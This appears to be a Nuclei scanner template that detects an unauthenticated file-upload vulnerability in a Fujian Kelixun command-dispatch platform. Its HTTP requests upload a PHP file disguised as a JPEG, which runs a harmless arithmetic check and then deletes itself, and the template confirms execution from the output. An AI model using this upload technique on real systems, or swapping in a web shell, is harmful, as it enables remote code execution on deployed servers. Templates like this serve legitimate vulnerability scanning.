id: zhdd-event-uploadfile-fileupload

info:
  name: 福建科立讯通信-指挥调度平台-文件上传-event-uploadfile
  author: HuanXiong
  severity: high
  description: |-
    
  reference:
    - 
  tags: File Upload

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /api/client/event/uploadfile.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary={{boundary}}

        --{{boundary}}
        Content-Disposition: form-data; name="uploadfile"; filename="{{filename}}.php"
        Content-Type: image/jpeg

        <?php echo 111*111; unlink(__FILE__); ?>
        --{{boundary}}--
        
      - |
        GET /{{url}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: json
        name: url
        internal: true
        json:
          - .url

    matchers:
      - type: dsl
        dsl:
          - contains(body_2, "12321")
